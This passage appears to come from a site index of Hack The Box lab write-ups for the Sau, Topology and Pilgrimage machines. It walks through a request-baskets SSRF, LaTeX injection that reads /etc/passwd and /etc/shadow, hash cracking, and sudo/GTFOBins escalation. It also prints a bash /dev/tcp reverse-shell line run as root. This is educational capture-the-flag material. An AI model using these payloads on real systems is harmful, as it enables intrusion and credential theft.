(0.19s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 4.73 seconds   We are dealing with an ubuntu focal.  55555: The nmap is taking a lot of time in determining the service. However, if we curl the port, we can see that it's a webserver:  └──╼ $curl -vvv sau.htb:55555 * Trying 10.10.11.224:55555... * Connected to sau.htb (10.10.11.224) port 55555 (#0) &gt; GET / HTTP/1.1 &gt; Host: sau.htb:55555 &gt; User-Agent: curl/7.88.1 &gt; Accept: */* &gt; &lt; HTTP/1.1 302 Found &lt; Content-Type: text/html; charset=utf-8 &lt; Location: /web &lt; Date: Wed, 27 Sep 2023 18:17:35 GMT &lt; Content-Length: 27 &lt; &lt;a href=&quot;/web&quot;&gt;Found&lt;/a&gt;.   The result from nmap came back and say that it cannot determine the service. We can see that if has something to do with baskets:  | invalid basket name; the name does not match pattern: ^[wd-_\\.]{1,250}$   If we curl the home page, we can see something interesting:   &lt;small&gt; Powered by &lt;a href=&quot;https://github.com/darklynx/request-baskets&quot;&gt;request-baskets&lt;/a&gt; | Version: 1.2.1 &lt;/small&gt;   Checking the website source code from the browser, we can see that there's a basket API which used a &quot;Master token&quot; for auth.   $.ajax({ method: &quot;POST&quot;, url: &quot;/api/baskets/&quot; + basket, headers: { &quot;Authorization&quot; : sessionStorage.getItem(&quot;master_token&quot;) }   After reading a bit, looks like the service is a server used to display HTTP requests  ","version":"Next","tagName":"h2"},{"title":"Foothold​","type":1,"pageTitle":"Sau","url":"/docs/write-up/htb/easy/sau#foothold","content":" Knowing the service and version, we can search for CVEs.  https://github.com/entr0pie/CVE-2023-27163  Looks like we can abuse of the request-baskets to access the webserver listening on port 80 but firewalled and...it's working:  ┌─[parrot@parrot]─[~/workspace/gal/htb/machines/sau/exploits] └──╼ $./CVE-2023-27163.sh http://sau.htb:55555/ http://127.0.0.1 Proof-of-Concept of SSRF on Request-Baskets (CVE-2023-27163) || More info at https://github.com/entr0pie/CVE-2023-27163 &gt; Creating the &quot;zfqies&quot; proxy basket... &gt; Basket created! &gt; Accessing http://sau.htb:55555/zfqies now makes the server request to http://127.0.0.1. &gt; Authorization: sXxaCFrbUXtDv3qiltNRTbGju6JosLVH8fL2DkqyeiN9   └──╼ $curl -vvv http://sau.htb:55555/zfqies * Trying 10.10.11.224:55555... * Connected to sau.htb (10.10.11.224) port 55555 (#0) &gt; GET /zfqies HTTP/1.1 &gt; Host: sau.htb:55555 &gt; User-Agent: curl/7.88.1 &gt; Accept: */* &gt; &lt; HTTP/1.1 200 OK &lt; Cache-Control: no-cache &lt; Connection: close &lt; Content-Security-Policy: default-src 'self'; style-src 'self' 'unsafe-inline'; img-src * blob:; script-src 'self' 'unsafe-eval' https://stat.ripe.net; frame-src *; object-src 'none'; block-all-mixed-content; &lt; Content-Type: text/html &lt; Date: Thu, 28 Sep 2023 09:29:31 GMT &lt; Last-Modified: Tue, 31 Jan 2023 18:18:07 GMT &lt; Server: Maltrail/0.53 &lt; Transfer-Encoding: chunked &lt; &lt;!DOCTYPE html&gt; &lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=utf8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, user-scalable=no&quot;&gt; &lt;meta name=&quot;robots&quot; content=&quot;noindex, nofollow&quot;&gt;   In the firewalled webserver there's an instance of maltrail 0.53 service, which making a quick google search has a OS command injection vulnerability in the username field of the /login endpoint. There's even a metasploit module to explot it. See: https://packetstormsecurity.com/files/174221/Maltrail-0.53-Unauthenticated-Command-Injection.html  I've made some attempts with the bash and sh payloads from reverse shell and base64 encoded, also play around with data encoding (url encode, form encode, ...)  Finally I've made it work by using a python payload, base64 and form encoding.  We can read the user flag  ","version":"Next","tagName":"h2"},{"title":"Privilege escalation​","type":1,"pageTitle":"Sau","url":"/docs/write-up/htb/easy/sau#privilege-escalation","content":" sudo -l shows that the user can execute systemctl status as any user (including root):  (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service   Let's search how to explot that in GTFO bins, looks like the default pager for systemctl is less, we can have access to root by just typing: !sh and voila!  We can read root flag. ","version":"Next","tagName":"h2"},{"title":"Topology","type":0,"sectionRef":"#","url":"/docs/write-up/htb/easy/topology","content":"","keywords":"","version":"Next"},{"title":"Enumeration​","type":1,"pageTitle":"Topology","url":"/docs/write-up/htb/easy/topology#enumeration","content":" Port 80 and 22 open  22  PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel   80  PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Miskatonic University | Topology Group   Browsing the website, found this subdomain: http://latex.topology.htb/equation.php, it contains a form where you input Latex commands and a mechanism behind that generates a png.  Let's search for more subdomains with gobuster:  ./gobuster vhost -u 10.10.11.217 -k --domain &quot;topology.htb&quot; --append-domain -w ~/workspace/gal/SecLists/Discovery/DNS/subdomains-top1million-5000.txt   Found subdomains:  dev.topology.htbstats.topology.htb  Most likely, the service works by writing the provided equation to a file, then invoke a command to pass from tex to png  In a log file we can see the following:  This is pdfTeX, Version 3.14159265-2.6-1.40.20 (TeX Live 2019/Debian) (preloaded format=pdflatex 2022.2.15) 12 MAR 2022 08:48   We see that we can inject commands in Latex, however there are some prohibitions in place:  Prohibited commands:  \\input\\include\\verbatiminput\\write\\outfile{Hello-world}\\immediate\\write18{id &gt; output}  ","version":"Next","tagName":"h2"},{"title":"Foothold​","type":1,"pageTitle":"Topology","url":"/docs/write-up/htb/easy/topology#foothold","content":" This payload works but only returns the first line:  \\newread\\file \\openin\\file=/etc/passwd \\read\\file to\\line \\text{\\line} \\closein\\file   There's another option to read files:  $\\lstinputlisting{/etc/passwd}$   Here we can see the user vdaisley.  Knowing that we have scanned the vhost and found dev and see some .htaccess and .htpasswd, now we can download them with the previous discovered reading method.  $\\lstinputlisting{&quot;/var/www/dev/.htpasswd&quot;}$ $\\lstinputlisting{&quot;/etc/shadow&quot;}$   it will download the PNG image with the file contents, the password stored is a MD5 hash, which we can extract using tesseract:  tesseract exfil/equation.png exfil/equation.txt   Then crack the hash using hashcat:  hashcat hash.txt ~/workspace/SecLists/Passwords/Leaked-Databases/rockyou.txt   This will return the password for user vdaisley, now you can SSH into the machine and get permanent access.  ","version":"Next","tagName":"h2"},{"title":"Privilege escalation​","type":1,"pageTitle":"Topology","url":"/docs/write-up/htb/easy/topology#privilege-escalation","content":" In /opt we can find the gnuplot binary owned by root but with write and execution permissions for the user.  This binary is used to generate the images. We can try to see if it's execute by running ps aux multiple times.  If we don't see any result, it means the process is executed by another user. But don't worry, we can use pspy to monitor processes not belonging to our user.  And there we see root is executing the following command  2023/06/13 16:33:01 CMD: UID=0 PID=1419 | find /opt/gnuplot -name *.plt -exec gnuplot {} ;   So basically, gnuplot will execute any plt file found in /opt/gnuplot.  Now what we can do is to create a plt file that will start a reverse shell with the user root.  e.g  system &quot;bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.151/4444 0&gt;&amp;1'&quot;   Once the connection is established, we'll have root access in the console and we can read the flag. ","version":"Next","tagName":"h2"},{"title":"Pilgrimage","type":0,"sectionRef":"#","url":"/docs/write-up/htb/easy/pilgrimage","content":"","keywords":"","version":"Next"},{"title":"Enumeration​","type":1,"pageTitle":"Pilgrimage","url":"/docs/write-up/htb/easy/pilgrimage#enumeration","content":" Open ports: 80 and 22  22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) 80/tcp open http nginx 1.18.0   └──╼ $whatweb pil.htb http://pil.htb [200 OK] Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.18.0], IP[10.10.11.219], JQuery, Script, Title[Pilgrimage - Shrink Your Images], nginx[1.18.0]   It's using PHP, the service looks useful to shrink images, it has a form where you upload an image and it will generate a new link with the shrink verion.  Brute-forcing the directory, we can see the webserver exposes the .git folder. Let's try to retrieve the code from there.  We can dump the exposed git folder and reconstruct the sources using https://github.com/arthaud/git-dumper  ","version":"Next","tagName":"h2"},{"title":"Foothold​","type":1,"pageTitle":"Pilgrimage","url":"/docs/write-up/htb/easy/pilgrimage#foothold","content":" Checking the code, we observe a potential command injection here:   $mime = &quot;.png&quot;; $imagePath = $upload-&gt;getFullPath(); if(mime_content_type($imagePath) === &quot;image/jpeg&quot;) { $mime = &quot;.jpeg&quot;; } $newname = uniqid(); exec(&quot;/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/&quot; . $upload-&gt;getName() . $mime . &quot; -resize 50% /var/www/pilgrimage.htb/shrunk/&quot; . $newname . $mime);   We can abuse the exec by breaking the cmd using:  $upload-&gt;getName()$mime$newname  $mime and $newname are not controlled by the user, which left us only $upload-&gt;getName() to try the command injection. getName cannot be abused because the value does not depend on the user.   /** * @param array $_files represents the $_FILES array passed as dependency */ public function __construct(array $_files = array()) { if (!function_exists('exif_imagetype')) { $this-&gt;error = 'Function \\'exif_imagetype\\' Not found. Please enable \\'php_exif\\' in your php.ini'; } $this-&gt;_files = $_files; }   The construct only reads $_FILES and set it to the variable, name cannot be abused.  Looks like the service is using imagemagick to do the shrinking, we have the binary, so we can extract the version from an x64_86 computer (same arch as the binary):  ./magick --version 7.1.0-49   If we search for vulnerabilities for that library, we'll find something interesting: https://www.uptycs.com/blog/denial-of-servicedos-and-arbitrary-file-read-vulnerability-in-imagemagick.  There's a very nice explanation on how to exploit this vulnerability. After exploiting this we can read the /etc/passwd and identify a user named emily.  Tried to search for some flags inside the home with no luck. Tried to get SSH keys without any luck.  Going back to the source code, we see that there's a dashboard querying a database, we can try to download that database  Decoded hex string: b'SQLite format 3\\x00\\x10\\x00\\x01\\x01\\x00@ \\x   Looks like we got it, we'll need to tweak the format a bit.  We need to pass the hex bytes to actual bytes and we'll retrieve the whole sqlite database where there's a table with username-password and the password for emily is there, later we can connect with SSH and we're in as emily. Now we can read the user flag.  ","version":"Next","tagName":"h2"},{"title":"Privilege escalation​","type":1,"pageTitle":"Pilgrimage","url":"/docs/write-up/htb/easy/pilgrimage#privilege-escalation","content":" For privilege escalation, looks like the user emily can execute the magick command which belongs to root:  emily@pilgrimage:/var/www/pilgrimage.htb$ ls -lisa |grep &quot;magick&quot; 43806 26912 -rwxr-xr-x 1 root root 27555008 Feb 15 2023 magick   Analyzing the processes, we see an interesting script executed as root:  #!/bin/bash blacklist=(&quot;Executable script&quot; &quot;Microsoft executable&quot;) /usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do filename=&quot;/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo &quot;$FILE&quot; | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')&quot; binout=&quot;$(/usr/local/bin/binwalk -e &quot;$filename&quot;)&quot; for banned in &quot;${blacklist[@]}&quot;; do if [[ &quot;$binout&quot; == *&quot;$banned&quot;* ]]; then /usr/bin/rm &quot;$filename&quot; break fi done done   Looks like this is performing some kind of scan of the files uploaded and uses the binwalk python module which analyse the uploaded file:  emily@pilgrimage:~$ binwalk -e /var/www/pilgrimage.htb/shrunk/6516e94e5aa54.png DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 PNG image, 7 x 7, 8-bit colormap, non-interlaced   The binary is just a convenient alias to the binwalk python library.  This looks promising...  From the very same github page of the project, there's a security warning:  Prior to Binwalk v2.3.3, extracted archives could create symlinks which point anywhere on the file system, potentially resulting in a directory traversal attack if subsequent extraction utilties blindly follow these symlinks. More generically, Binwalk makes use of many third-party extraction utilties which may have unpatched security issues; Binwalk v2.3.3 and later allows external extraction tools to be run as an unprivileged user using the run-as command line option (this requires Binwalk itself to be run with root privileges). Additionally, Binwalk v2.3.3 and later will refuse to perform extraction as root unless --run-as=root is specified.   Here we are dealing with binwalk v2.3.2, so it contains this vulnerability.  More details about the vulnerability:  https://onekey.com/blog/security-advisory-remote-command-execution-in-binwalk/https://github.com/electr0sm0g/CVE-2022-4510  The idea is to generate the payload to open a connection and upload it via SCP with the emily user. If we upload it via the web it will not open the connection since the image generated by convert, will not have the malicious payload to abuse binwalk. ","version":"Next","tagName":"h2"}],"options":{"id":"default"}}